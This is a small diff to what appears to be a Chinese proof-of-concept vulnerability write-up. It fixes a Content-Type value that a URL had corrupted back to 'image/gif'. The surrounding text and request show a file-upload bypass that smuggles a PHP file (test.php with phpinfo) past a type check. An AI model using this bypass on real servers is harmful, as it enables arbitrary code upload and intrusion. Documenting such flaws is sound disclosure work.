@@ -89,7 +89,7 @@ if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
 
 
 
-其中使用 **Content-Type:** [**http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif**](http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif)  即可绕过上传PHP文件
+其中使用 image/gif 即可绕过上传PHP文件
 
 
 
@@ -101,7 +101,7 @@ Content-Length: 208
 
 ------WebKitFormBoundary8UaANmWAgM4BqBSs
 Content-Disposition: form-data; name="files"; filename="test.php"
-Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
+Content-Type: image/gif
 
 <?php phpinfo();?>
 ------WebKitFormBoundary8UaANmWAgM4BqBSs—
